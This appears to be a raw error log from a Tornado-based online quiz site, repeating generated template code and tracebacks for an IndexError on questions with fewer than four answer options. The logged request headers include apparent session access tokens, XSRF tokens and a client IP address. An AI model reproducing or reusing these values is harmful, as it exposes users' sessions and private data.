  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059f3948e4c854802b2dbc3&answers=%5B1%5D&cursor=5&_xsrf=11cac5be243b43cea91e403e51c6a2c4', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8,fr;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '89.105.120.34', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFLOXBwRFpDekVHdTRISGJsWElvMWlONTdFa3IydmlKQzkxRHRHUXk2OGo3TG1idmx3NU5IRHlRWkEyMDZ0SHltWkNrSlFaQTZiT0RXNVlQVURnWkQ=|1348071970|5ad04f2838496896e2949f74560fd9295dc1e1c3"; _xsrf=11cac5be243b43cea91e403e51c6a2c4; __utma=188782963.779422263.1348071853.1348071853.1348071853.1; __utmb=188782963.9.10.1348071853; __utmc=188782963; __utmz=188782963.1348071853.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 212.65ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059f49c8e4c85480ff4f8c1&answers=%5B0%2C2%2C3%5D&cursor=6&_xsrf=1cb4017f52d340adab7690f63513f0a2', headers={'Content-Length': '100', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Dnt': '1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'X-Real-Ip': '89.105.120.34', 'Origin': 'http://www.intheory.co.uk', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Host': 'www.intheory.co.uk', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFNN1A1OVZtZU5zN2YyOTdOeWNEOHZ0ejYyb3ZaQnExdWJIdHlUMDZVbUMyYXpvU1VxRXpWV1ZrNUhrOEo4VFZJRU0wWkFPampPeWFxNW5vSnkzWkNFZ1pBeEgwRXdaRFpE|1348052806|3985d8d1466122be97d1521ce5e9e02404b570f3; _xsrf=1cb4017f52d340adab7690f63513f0a2; __utma=188782963.2051100369.1348052782.1348052782.1348070864.2; __utmb=188782963.12.10.1348070864; __utmc=188782963; __utmz=188782963.1348052782.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 118.08ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
